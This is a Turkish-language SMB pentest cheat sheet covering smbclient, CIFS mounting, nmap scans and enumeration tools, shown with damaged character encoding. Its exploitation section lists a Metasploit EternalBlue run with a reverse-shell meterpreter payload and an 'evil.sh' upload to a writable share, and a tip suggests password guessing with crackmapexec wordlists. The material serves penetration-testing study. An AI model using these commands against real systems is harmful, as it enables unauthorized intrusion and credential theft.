## 1ï¸âƒ£ SMB Temelleri

- **SMB (Server Message Block)**: Windows dosya paylaÅŸÄ±mÄ± protokolÃ¼. Linuxâ€™ta `samba`, `smbclient`, `cifs-utils` ile kullanÄ±lÄ±r.
    
- **Portlar**:
    
    - 139/tcp â†’ NetBIOS Session Service
        
    - 445/tcp â†’ Direct SMB over TCP
        

---

## 2ï¸âƒ£ SMB BaÄŸlantÄ±sÄ± ve Dosya Listeleme

### smbclient (Windowsâ€™ta `net use` gibi)

```bash
# Share'e baÄŸlanmak
smbclient //TARGET_IP/ShareName -U username

# Åifresiz denemek
smbclient -L //TARGET_IP -N
```

- `-L` â†’ Share listesini gÃ¶sterir.
    
- `-U user` â†’ KullanÄ±cÄ± belirtir.
    
- `-N` â†’ Åifre sormadan deneme.
    

**Ã–rnek:**

```bash
smbclient //192.168.1.10/Public -U guest
```

Ä°Ã§inde gezinmek iÃ§in:

```bash
ls         # dosya listele
cd folder  # klasÃ¶re gir
get file   # indir
put file   # yÃ¼kle
```

---

## 3ï¸âƒ£ CIFS ile Mount Etme

```bash
# Mount etmek
sudo mount -t cifs //TARGET_IP/ShareName /mnt/share -o username=user,password=pass,vers=3.0
```

- `/mnt/share` â†’ Local mount point
    
- `vers=2.0` veya `3.0` â†’ SMB versiyonu (serverâ€™a gÃ¶re deÄŸiÅŸir)
    
- Åifresiz eriÅŸim:
    

```bash
sudo mount -t cifs //192.168.1.10/Public /mnt/share -o guest,vers=3.0
```

- Dosya izinlerini yÃ¶netmek iÃ§in:
    

```bash
-o uid=$(id -u),gid=$(id -g)
```

---

## 4ï¸âƒ£ Nmap ile SMB Tarama

```bash
# SMB portlarÄ±nÄ± taramak
nmap -p 139,445 TARGET_IP

# SMB servis ve versiyon tespiti
nmap -p 445 --script smb-protocols,smb-os-discovery TARGET_IP

# TÃ¼m SMB scriptleri ile tarama
nmap -p 445 --script smb* TARGET_IP
```

---

## 5ï¸âƒ£ Enum / Bilgi Toplama AraÃ§larÄ±

### enum4linux

```bash
enum4linux TARGET_IP
# Windows kullanÄ±cÄ±larÄ±, paylaÅŸÄ±mlar, group'lar
```

### crackmapexec (pentest iÃ§in)

```bash
# SMB login testi
crackmapexec smb TARGET_IP -u user -p pass

# Domain bilgisini Ã§ekmek
crackmapexec smb TARGET_IP --shares
```

### smbmap

```bash
smbmap -H TARGET_IP -u username -p password
# Share ve izinleri listele
```

---

## 6ï¸âƒ£ SMB Exploitation (SÄ±zma Testleri)

> **Not:** Bu bÃ¶lÃ¼m yalnÄ±zca laboratuvar/test ortamÄ±nda kullanÄ±lmalÄ±dÄ±r.

### Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST TARGET_IP
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
exploit
```

### smbclient ile writable share testi

```bash
smbclient //TARGET_IP/Public -U user
put evil.sh
```

- Writable share â†’ Payload yÃ¼kleme imkanÄ±.
    

---

## 7ï¸âƒ£ SMB Versiyon ve GÃ¼venlik

- SMBv1 â†’ Eski, exploit riski yÃ¼ksek (EternalBlue gibi)
    
- SMBv2/v3 â†’ Daha gÃ¼venli, modern Windows ve Linux destekli
    
- Linuxâ€™ta versiyon kontrolÃ¼:
    

```bash
smbclient -L //TARGET_IP -m SMB2
```

---

## 8ï¸âƒ£ Pratik Ä°puÃ§larÄ±

- Share isimlerini hÄ±zlÄ± gÃ¶rmek iÃ§in: `smbclient -L //IP -N`
    
- Åifreleri tahmin etmek iÃ§in: `crackmapexec smb IP -u users.txt -p passwords.txt`
    
- Dosya transferinde hÄ±zlÄ± yol: mount edip rsync ile kopya Ã§ekmek
    
- smbmap â†’ share Ã¼zerinde yetki ve writable kontrolÃ¼ iÃ§in ideal
    

---

### 9ï¸âƒ£ Ã–zet Tablo

|Komut|AmaÃ§|
|---|---|
|`smbclient -L //IP`|Share listesi|
|`smbclient //IP/Share -U user`|Shareâ€™e baÄŸlan|
|`mount -t cifs //IP/Share /mnt`|Shareâ€™i mount et|
|`enum4linux IP`|Windows info toplama|
|`nmap -p445 --script smb* IP`|SMB tarama|
|`smbmap -H IP -u user -p pass`|Share izinlerini listele|
|`crackmapexec smb IP -u user -p pass`|SMB login test / enum|

---

ğŸ’¡ **Not:** Linuxâ€™ta SMB testi yaparken, hem `smbclient` hem `mount` yÃ¶ntemlerini bilmek Ã§ok pratik. Tarama ve exploit iÃ§in `nmap`, `enum4linux`, `smbmap` ve `crackmapexec` iÅŸini kolaylaÅŸtÄ±rÄ±r.

---